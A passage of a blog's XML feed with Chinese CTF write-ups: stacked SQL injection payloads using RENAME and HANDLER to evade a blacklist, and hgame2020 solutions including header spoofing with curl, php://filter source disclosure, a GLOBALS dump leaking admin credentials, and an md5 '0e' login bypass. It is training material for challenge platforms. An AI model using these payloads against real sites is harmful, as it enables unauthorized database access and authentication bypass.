class="string">`1919810931114514`</span> <span class="keyword">to</span> words;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">add</span> <span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">Null</span> auto_increment primary <span class="keyword">key</span>;alert table words <span class="keyword">change</span> flag <span class="keyword">data</span> <span class="built_in">varchar</span>(<span class="number">100</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></li><li><p>直接1’ or 1=1#读到flag</p></li></ol><h2 id="进阶plus"><a href="#进阶plus" class="headerlink" title="进阶plus"></a>进阶plus</h2><ol><li>天杀的出题人为难人最了得，直接继续把<strong>alert</strong>和<strong>rename</strong>放进黑名单，搞得我做过一样的题，但还是莫得办法，<del>太菜了</del></li><li>办法总比困难多吧，学习姿势更重要！<a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">mysql查询语句-handler</a><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">handler</span> FlagHere <span class="keyword">open</span>;<span class="keyword">handler</span> FlagHere <span class="keyword">read</span> <span class="keyword">first</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;强网杯随便住所带来的一些waf及绕过-训练平台buuctf&quot;&gt;&lt;a href=&quot;#强网杯随便住所带来的一些waf及绕过-训练平台buuctf&quot; class=&quot;headerlink&quot; title=&quot;强网杯随便住所带来的一些waf及绕过(训练平台buuctf)&quot;&gt;&lt;/a&gt;强网杯随便住所带来的一些waf及绕过(训练平台buuctf)&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;进来是一个输入框&lt;figure class=&quot;highlight cs&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//e363d307-2ea5-4947-921c-99079448435d.node1.buuoj.cn/?inject=1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;回显:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;array(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  [&lt;span class=&quot;meta&quot;&gt;0&lt;/span&gt;]=&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  [&lt;span class=&quot;meta&quot;&gt;1&lt;/span&gt;]=&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;) &lt;span class=&quot;string&quot;&gt;&quot;hahahah&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="CTFWP" scheme="https://cy9nusg4rd3n.github.io/categories/CTFWP/"/>
    
    
      <category term="Web" scheme="https://cy9nusg4rd3n.github.io/tags/Web/"/>
    
      <category term="SQL" scheme="https://cy9nusg4rd3n.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>hgame2020部分WP</title>
    <link href="https://cy9nusg4rd3n.github.io/2020/02/10/hgame2020%E9%83%A8%E5%88%86WP/"/>
    <id>https://cy9nusg4rd3n.github.io/2020/02/10/hgame2020部分WP/</id>
    <published>2020-02-10T05:31:56.000Z</published>
    <updated>2020-04-18T03:19:53.151Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Week-1"><a href="#Week-1" class="headerlink" title="Week-1"></a>Week-1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h3><ol><li>很明显提醒了<strong>版本管理工具</strong>和<strong>git</strong><a id="more"></a></li><li><p>访问/.git/config</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[core]</span><br><span class="line">repositoryformatversion = <span class="number">0</span></span><br><span class="line">filemode = <span class="keyword">true</span></span><br><span class="line">bare = <span class="keyword">false</span></span><br><span class="line">logallrefupdates = <span class="keyword">true</span></span><br><span class="line">[remote <span class="string">"origin"</span>]</span><br><span class="line">url = <span class="symbol">https:</span>/<span class="regexp">/github.com/</span>FeYcYodhrPDJSru/<span class="number">8</span>LTUKCL83VLhXbc</span><br><span class="line">fetch = +refs/heads/*<span class="symbol">:refs/remotes/origin/*</span></span><br></pre></td></tr></table></figure></li><li><p>把库down下来,用TortioseGit-&gt;Show ReFlog-&gt;show log</p></li><li>找到flag文件,base64解码即可</li></ol><h3 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h3><ol><li>这题主要修改各种请求头，值得注意的是最后一个<blockquote><p>Last-Modiﬁed: Fri, 01 Jan 2077 00:00:00 GMT</p></blockquote></li><li>关于If-Unmodified-Since<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Unmodiﬁed-Since" target="_blank" rel="noopener">参考</a></li><li>最终exp<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET \  http://kyaru.hgame.n3ko.co/ \  </span><br><span class="line">-<span class="ruby">H <span class="string">'Host: kyaru.hgame.n3ko.co'</span> \  </span></span><br><span class="line"><span class="ruby">-H <span class="string">'If-Unmodified-Since: Tue, 7 Oct 2077 00:00:00 GMT'</span> \  </span></span><br><span class="line"><span class="ruby">-H <span class="string">'Referer: vidar.club'</span> \  </span></span><br><span class="line"><span class="ruby">-H <span class="string">'User-Agent: Cosmos'</span> \  </span></span><br><span class="line"><span class="ruby">-H <span class="string">'X-Forwarded-For: 127.0.0.1'</span></span></span><br></pre></td></tr></table></figure></li></ol><h3 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h3><ol><li>点进去跳到/new.php的页面，显示403 Forbidden</li><li>抓包发现302跳转且出现状态码405,可能是请求方式不对</li><li>改GET为POST得到人机认证页面，要我们使两个数相加为10</li><li>考虑到+号在URL中表示为空格,因此将其Urlencode</li><li>因此抓包POST /?a=5%2b5</li></ol><h3 id="鸡尼泰玫"><a href="#鸡尼泰玫" class="headerlink" title="鸡尼泰玫"></a>鸡尼泰玫</h3><ol><li>这是一个以我坤做的小页游，理论达到30000分数即可getflag</li><li>当然既然是CTF一般不会让你真的玩游戏，所以这题是JS调试</li><li>Google浏览器F12走起,然后F8，在game.js/?s=4里进行调试将globalScore改为30000即可</li></ol><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h3><ol><li>签到题给出如下<blockquote><p>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t </p></blockquote></li><li>base64-&gt;摩斯编码即可getflag</li></ol><h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><ol><li>图片包含一个压缩包zip，打开压缩包发现提示<blockquote><p>Password is picture ID.</p></blockquote></li><li>通过社工发现<a href="https://www.pixiv.net/artworks/76953815" target="_blank" rel="noopener">https://www.pixiv.net/artworks/76953815</a></li><li>76953815即为密码得到flag.txt<blockquote><p>\u68\u67\u61\u6d\u65\u7b\u44\u6f\u5f\u79\u30\u75\u5f\u4b\u6e\u4f\u57\u5f\u75\u4 e\u69\u43\u30\u64\u33\u3f\u7d</p></blockquote></li><li>补零为Unicode<blockquote><p>\u0068\u0067\u0061\u006d\u0065\u007b\u0044\u006f\u005f\u0079\u0030\u0075\u005f\ u004b\u006e\u004f\u0057\u005f\u0075\u004e\u0069\u0043\u0030\u0064\u0033\u003f\u 007d</p></blockquote></li><li>解码即可,也可按\u后面的数字进行ascii解码</li></ol><h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><ol><li>解压题目发现有Bacon.txt和有密码的Novel.zip，同时发现Novel.zip里面有一个Bacon.txt,查看其crc32发现一致，考虑明文攻击</li><li>这里用7-zip压缩(原来用了什么软件压缩，就用什么，即使同为zip不同软件的算法不一样的)</li><li><p>解密出来发现doc文档有密码，再看一下Bacon.txt</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">of</span> SuCh GrEAt powers <span class="keyword">OR</span> beiNGS tHere may BE conCEivAbly A SuRvIval <span class="keyword">oF</span> HuGely REmOTE periOd.</span><br><span class="line">*Password <span class="keyword">in</span> capital letters.</span><br></pre></td></tr></table></figure></li><li><p>猜测为培根密码</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line">strr=<span class="string">'ofSuChGrEAtpowersORbeiNGStHeremayBEconCEivAblyASuRvIvaloFHuGelyREmOTEperiOd'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">    <span class="keyword">if</span> ord(i) &gt;= <span class="number">65</span> <span class="keyword">and</span> ord(i) &lt;= <span class="number">90</span>:</span><br><span class="line">        flag += <span class="string">'b'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="string">'a'</span></span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">letters1 = [</span><br><span class="line">    <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>,</span><br><span class="line">    <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>, <span class="string">'N'</span>,</span><br><span class="line">    <span class="string">'O'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>,</span><br><span class="line">    <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>,</span><br><span class="line">]</span><br><span class="line">letters2 = [</span><br><span class="line">    <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>,</span><br><span class="line">    <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>,</span><br><span class="line">    <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>,</span><br><span class="line">    <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>,</span><br><span class="line">]</span><br><span class="line">cipher1 = [</span><br><span class="line">    <span class="string">"aaaaa"</span>, <span class="string">"aaaab"</span>, <span class="string">"aaaba"</span>, <span class="string">"aaabb"</span>, <span class="string">"aabaa"</span>, <span class="string">"aabab"</span>, <span class="string">"aabba"</span>,</span><br><span class="line">    <span class="string">"aabbb"</span>, <span class="string">"abaaa"</span>, <span class="string">"abaab"</span>, <span class="string">"ababa"</span>, <span class="string">"ababb"</span>, <span class="string">"abbaa"</span>, <span class="string">"abbab"</span>,</span><br><span class="line">    <span class="string">"abbba"</span>, <span class="string">"abbbb"</span>, <span class="string">"baaaa"</span>, <span class="string">"baaab"</span>, <span class="string">"baaba"</span>, <span class="string">"baabb"</span>,</span><br><span class="line">    <span class="string">"babaa"</span>, <span class="string">"babab"</span>, <span class="string">"babba"</span>, <span class="string">"babbb"</span>, <span class="string">"bbaaa"</span>, <span class="string">"bbaab"</span>,</span><br><span class="line">]</span><br><span class="line">cipher2 = [</span><br><span class="line">    <span class="string">"AAAAA"</span>, <span class="string">"AAAAB"</span>, <span class="string">"AAABA"</span>, <span class="string">"AAABB"</span>, <span class="string">"AABAA"</span>, <span class="string">"AABAB"</span>, <span class="string">"AABBA"</span>,</span><br><span class="line">    <span class="string">"AABBB"</span>, <span class="string">"ABAAA"</span>, <span class="string">"ABAAA"</span>, <span class="string">"ABAAB"</span>, <span class="string">"ABABA"</span>, <span class="string">"ABABB"</span>, <span class="string">"ABBAA"</span>,</span><br><span class="line">    <span class="string">"ABBAB"</span>, <span class="string">"ABBBA"</span>, <span class="string">"ABBBB"</span>, <span class="string">"BAAAA"</span>, <span class="string">"BAAAB"</span>, <span class="string">"BAABA"</span>,</span><br><span class="line">    <span class="string">"BAABB"</span>, <span class="string">"BAABB"</span>, <span class="string">"BABAA"</span>, <span class="string">"BABAB"</span>, <span class="string">"BABBA"</span>, <span class="string">"BABBB"</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def bacon1(<span class="keyword">string</span>):</span><br><span class="line">    lists = []</span><br><span class="line">    <span class="comment"># 分割，五个一组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="built_in">len</span>(<span class="keyword">string</span>), <span class="number">5</span>):</span><br><span class="line">        lists.append(<span class="keyword">string</span>[i:i+<span class="number">5</span>])</span><br><span class="line">    <span class="comment"># print(lists)</span></span><br><span class="line">    <span class="comment"># 循环匹配，得到下标，对应下标即可</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="built_in">len</span>(lists)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> lists[i] == cipher1[j]:</span><br><span class="line">                <span class="comment"># print(j)</span></span><br><span class="line">                print(letters1[j], <span class="keyword">end</span>=<span class="string">""</span>)</span><br><span class="line">    print(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def bacon2(<span class="keyword">string</span>):</span><br><span class="line">    lists = []</span><br><span class="line">    <span class="comment"># 分割，五个一组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="built_in">len</span>(<span class="keyword">string</span>), <span class="number">5</span>):</span><br><span class="line">        lists.append(<span class="keyword">string</span>[i:i+<span class="number">5</span>])</span><br><span class="line">    <span class="comment"># print(lists)</span></span><br><span class="line">    <span class="comment"># 循环匹配，得到下标，对应下标即可</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="built_in">len</span>(lists)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> lists[i] == cipher2[j]:</span><br><span class="line">                <span class="comment"># print(j)</span></span><br><span class="line">                print(letters2[j], <span class="keyword">end</span>=<span class="string">""</span>)</span><br><span class="line">    print(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    bacon1(<span class="string">"aababababbaaaaaaabba"</span>)</span><br><span class="line">    bacon2(<span class="string">"AABABABABAAAAAAAABBA"</span>)</span><br><span class="line">    bacon1(flag)</span><br><span class="line">    bacon2(flag)</span><br></pre></td></tr></table></figure></li><li><p>得到doc密码FLAGHIDDENINDOC</p></li><li>进入文档显示隐藏文字找到flag</li></ol><h3 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h3><ol><li><p>解压附件得到加密的OK.zip和Password.txt,Password内容如下</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Rdjxfwxjfimkn <span class="keyword">z</span>,<span class="keyword">ts</span> wntzi xtjrwm xsfjt jm ywt rtntwhf <span class="keyword">f</span> <span class="keyword">y</span>   h jnsxf qjFjf jnb  rg fiyykwtbsnkm <span class="keyword">tm</span>  <span class="keyword">xa</span> jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.</span><br><span class="line"></span><br><span class="line">JRFVJYFZVRUAGMAI</span><br><span class="line"></span><br><span class="line">* Three fenses <span class="keyword">first</span>, Five Caesar <span class="keyword">next</span>. English sentense <span class="keyword">first</span>,  zip password <span class="keyword">next</span>.</span><br></pre></td></tr></table></figure></li><li><p>按提示解密得到</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Many years <span class="keyword">later</span> <span class="keyword">as</span> he faced the firing squad, Colonel Aureliano Buendia was  <span class="keyword">to</span> remember that distant afternoon when <span class="keyword">his</span> father took him <span class="keyword">to</span> discover ice.</span><br><span class="line"></span><br><span class="line">EAVMUBAQHQMVEPDT</span><br></pre></td></tr></table></figure></li><li><p>EAVMUBAQHQMVEPDT为解压密码打开OK.zip</p></li><li>接着是解密:OOK-&gt;base32-&gt;base64</li><li>将base64解码内容二进制保存为png得到二维码，扫码getflag</li></ol><h3 id="每日推荐"><a href="#每日推荐" class="headerlink" title="每日推荐"></a>每日推荐</h3><ol><li>解压附件得到Capture1.pcapng，wireshark打开</li><li>导出http对象，发现一个比较大的php文件发现里面藏着zip</li><li>提示密码为6位数字爆破得759371</li><li>解压得到mp3文件，丢进audacity,在频谱图里看到flag</li></ol><h1 id="Week-2"><a href="#Week-2" class="headerlink" title="Week-2"></a>Week-2</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h3><ol><li>进来是一个登陆框</li><li>一开始以为是注入，一顿操作没发现注入点</li><li>后来注意到主页跳转到/?action=login.php</li><li><p>尝试php伪协议</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">action=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=login.php</span><br><span class="line"></span><br><span class="line">include <span class="string">"config.php"</span>;</span><br><span class="line">nsession_start();</span><br><span class="line"><span class="regexp">//</span>Only <span class="keyword">for</span> debug <span class="keyword">if</span> (DEBUG_MODE)&#123;    </span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'debug'</span>])) &#123;        </span><br><span class="line"><span class="variable">$v</span> = <span class="variable">$_GET</span>[<span class="string">'debug'</span>];        </span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, <span class="variable">$v</span>)) &#123;            </span><br><span class="line">die(<span class="string">"args error!"</span>);        </span><br><span class="line">&#125;        </span><br><span class="line">eval(<span class="string">"var_dump($$v);"</span>);    </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">........  </span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">'username'</span>]) &amp;&amp; isset(<span class="variable">$_POST</span>[<span class="string">'password'</span>])) &#123;        </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$admin_password</span> == md5(<span class="variable">$_POST</span>[<span class="string">'password'</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">'username'</span>] === <span class="variable">$admin_username</span>)&#123;            </span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'username'</span>] = <span class="variable">$_POST</span>[<span class="string">'username'</span>];            </span><br><span class="line">header(<span class="string">"Location: admin.php"</span>);            </span><br><span class="line"><span class="keyword">exit</span>();        </span><br><span class="line">&#125;        </span><br><span class="line"><span class="keyword">else</span> &#123;            </span><br><span class="line">echo <span class="string">"用户或密码错误"</span>;</span><br><span class="line">&#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以知道$admin_password和$admin_username被定义在config.php中，我们可以尝试用超全局变量GLOBALS获取</p></li><li><p>/?action=login.php&amp;debug=GLOBALS</p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>(<span class="number">11</span>) &#123; [<span class="string">"_GET"</span>]=&gt; <span class="built_in">array</span>(<span class="number">2</span>) &#123; [<span class="string">"action"</span>]=&gt; <span class="built_in">string</span>(<span class="number">9</span>) <span class="string">"login.php"</span> [<span class="string">"debug"</span>]=&gt; <span class="built_in">string</span>(<span class="number">7</span>) <span class="string">"GLOBALS"</span> &#125; [<span class="string">"_POST"</span>]=&gt; <span class="built_in">array</span>(<span class="number">0</span>) &#123; &#125; [<span class="string">"_COOKIE"</span>]=&gt; <span class="built_in">array</span>(<span class="number">1</span>) &#123; [<span class="string">"PHPSESSID"</span>]=&gt; <span class="built_in">string</span>(<span class="number">26</span>) <span class="string">"3ah0se711epa48hstc537tce2b"</span> &#125; [<span class="string">"_FILES"</span>]=&gt; <span class="built_in">array</span>(<span class="number">0</span>) &#123; &#125; [<span class="string">"action"</span>]=&gt; <span class="built_in">string</span>(<span class="number">9</span>) <span class="string">"login.php"</span> [<span class="string">"filter"</span>]=&gt; <span class="built_in">string</span>(<span class="number">18</span>) <span class="string">"/config|etc|flag/i"</span> [<span class="string">"_SESSION"</span>]=&gt; &amp;<span class="built_in">array</span>(<span class="number">0</span>) &#123; &#125; [<span class="string">"debug"</span>]=&gt; <span class="built_in">string</span>(<span class="number">7</span>) <span class="string">"GLOBALS"</span> [<span class="string">"admin_password"</span>]=&gt; <span class="built_in">string</span>(<span class="number">32</span>) <span class="string">"0e114902927253523756713132279690"</span> [<span class="string">"admin_username"</span>]=&gt; <span class="built_in">string</span>(<span class="number">7</span>) <span class="string">"Cosmos!"</span> [<span class="string">"GLOBALS"</span>]=&gt; <span class="built_in">array</span>(<span class="number">11</span>) &#123; [<span class="string">"_GET"</span>]=&gt; <span class="built_in">array</span>(<span class="number">2</span>) &#123; [<span class="string">"action"</span>]=&gt; <span class="built_in">string</span>(<span class="number">9</span>) <span class="string">"login.php"</span> [<span class="string">"debug"</span>]=&gt; <span class="built_in">string</span>(<span class="number">7</span>) <span class="string">"GLOBALS"</span> &#125; [<span class="string">"_POST"</span>]=&gt; <span class="built_in">array</span>(<span class="number">0</span>) &#123; &#125; [<span class="string">"_COOKIE"</span>]=&gt; <span class="built_in">array</span>(<span class="number">1</span>) &#123; [<span class="string">"PHPSESSID"</span>]=&gt; <span class="built_in">string</span>(<span class="number">26</span>) <span class="string">"3ah0se711epa48hstc537tce2b"</span> &#125; [<span class="string">"_FILES"</span>]=&gt; <span class="built_in">array</span>(<span class="number">0</span>) &#123; &#125; [<span class="string">"action"</span>]=&gt; <span class="built_in">string</span>(<span class="number">9</span>) <span class="string">"login.php"</span> [<span class="string">"filter"</span>]=&gt; <span class="built_in">string</span>(<span class="number">18</span>) <span class="string">"/config|etc|flag/i"</span> [<span class="string">"_SESSION"</span>]=&gt; &amp;<span class="built_in">array</span>(<span class="number">0</span>) &#123; &#125; [<span class="string">"debug"</span>]=&gt; <span class="built_in">string</span>(<span class="number">7</span>) <span class="string">"GLOBALS"</span> [<span class="string">"admin_password"</span>]=&gt; <span class="built_in">string</span>(<span class="number">32</span>) <span class="string">"0e114902927253523756713132279690"</span> [<span class="string">"admin_username"</span>]=&gt; <span class="built_in">string</span>(<span class="number">7</span>) <span class="string">"Cosmos!"</span> [<span class="string">"GLOBALS"</span>]=&gt; *<span class="type">RECURSION</span>* &#125; &#125;</span><br></pre></td></tr></table></figure></li><li><p>尽管知道了账号密码，但是密码经过md5加密，我们便无法还原原来的密码，不过注意到</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$admin_password == md5($_POST[<span class="string">'password'</span>]</span><br><span class="line">[<span class="string">"admin_password"</span>]=&gt; <span class="built_in">string</span>(<span class="number">32</span>) <span class="string">"0e114902927253523756713132279690"</span></span><br></pre></td></tr></table></figure></li><li><p>弱类型和0e,随便找一个md5后为0e开头的字符串就行,账号为Cosmos!</p><blockquote><p>s155964671a</p></blockquote></li><li><p>登陆后有一个外部URL插入图片功能，php伪协议获得admin.php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_img</span><span class="params">()</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'img_url'</span>])) &#123;        </span><br><span 